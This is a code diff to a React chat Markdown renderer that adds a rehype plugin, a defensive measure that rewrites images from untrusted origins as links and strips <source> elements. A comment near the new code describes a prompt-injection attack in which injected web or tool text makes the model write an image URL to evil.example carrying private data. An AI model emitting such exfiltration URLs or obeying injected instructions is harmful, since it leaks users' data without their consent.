@@ -2,7 +2,7 @@ import "./ai-chat-markdown.css";
 
 import { isValidElement, memo, type ComponentPropsWithoutRef, type ReactNode } from "react";
 import remarkBreaks from "remark-breaks";
-import { defaultRemarkPlugins, Streamdown, type Components } from "streamdown";
+import { defaultRehypePlugins, defaultRemarkPlugins, Streamdown, type Components } from "streamdown";
 import { CopyIconButton } from "@/components/copy-icon-button.tsx";
 import { cn } from "@/lib/utils.ts";
 import type { AppClassName } from "../../lib/dom-utils.ts";
@@ -270,6 +270,65 @@ const ai_chat_markdown_components = {
 	td: AiChatMarkdownTd,
 } satisfies Components;
 
+/**
+ * Only these origins may load images in chat Markdown: the app and the R2 host that serves
+ * Press media. Chat text can repeat web pages, search results, or tool output, so injected text
+ * can make the model write `![x](https://evil.example/?d=<private data>)`. The browser would load
+ * that image at once and send the data, with no click and no approval.
+ */
+const trusted_image_origins = new Set([
+	window.location.origin,
+	`https://${import.meta.env.VITE_R2_FILES_DOWNLOAD_HOST as string}`,
+]);
+
+/**
+ * The part of a hast node that `rehype_untrusted_images_to_links` reads.
+ * The app does not depend on `@types/hast`.
+ */
+type AiChatMarkdownHastNode = {
+	type: string;
+	tagName?: string;
+	properties?: Record<string, unknown>;
+	children?: AiChatMarkdownHastNode[];
+	value?: string;
+};
+
+/**
+ * Run this after Streamdown's `harden` step. Harden already removed unsafe protocols, so every
+ * image `src` here is a valid URL. Harden cannot turn an image into a link, so this step does it.
+ */
+function rehype_untrusted_images_to_links() {
+	const visit = (node: AiChatMarkdownHastNode, isInsideLink: boolean) => {
+		node.children = node.children?.flatMap((child) => {
+			if (child.type !== "element") {
+				return [child];
+			}
+
+			// Drop `<source>`. Its `srcset` also loads an image, and harden does not check it.
+			if (child.tagName === "source") {
+				return [];
+			}
+
+			if (child.tagName === "img") {
+				const src = String(child.properties?.src);
+				if (trusted_image_origins.has(new URL(src, window.location.origin).origin)) {
+					return [child];
+				}
+
+				// Show the image as a link, so Streamdown still asks before it opens the URL.
+				// A link cannot hold another link, so inside a link keep only the text.
+				const text = { type: "text", value: String(child.properties?.alt || src) };
+				return isInsideLink ? [text] : [{ type: "element", tagName: "a", properties: { href: src }, children: [text] }];
+			}
+
+			visit(child, isInsideLink || child.tagName === "a");
+			return [child];
+		});
+	};
+
+	return (tree: AiChatMarkdownHastNode) => visit(tree, false);
+}
+
 export type AiChatMarkdown_Props = {
 	className?: string;
 	contentClassName?: string;
@@ -282,6 +341,7 @@ export const AiChatMarkdown = memo(function AiChatMarkdown(props: AiChatMarkdown
 	// remark-breaks renders soft line breaks as <br> like chat UIs do, since
 	// model output relies on single newlines for line separation.
 	const remarkPlugins = [...Object.values(defaultRemarkPlugins), remarkBreaks];
+	const rehypePlugins = [...Object.values(defaultRehypePlugins), rehype_untrusted_images_to_links];
 
 	return (
 		<div
@@ -296,6 +356,7 @@ export const AiChatMarkdown = memo(function AiChatMarkdown(props: AiChatMarkdown
 					contentClassName,
 				)}
 				remarkPlugins={remarkPlugins}
+				rehypePlugins={rehypePlugins}
 				components={ai_chat_markdown_components}
 			>
 				{markdown}
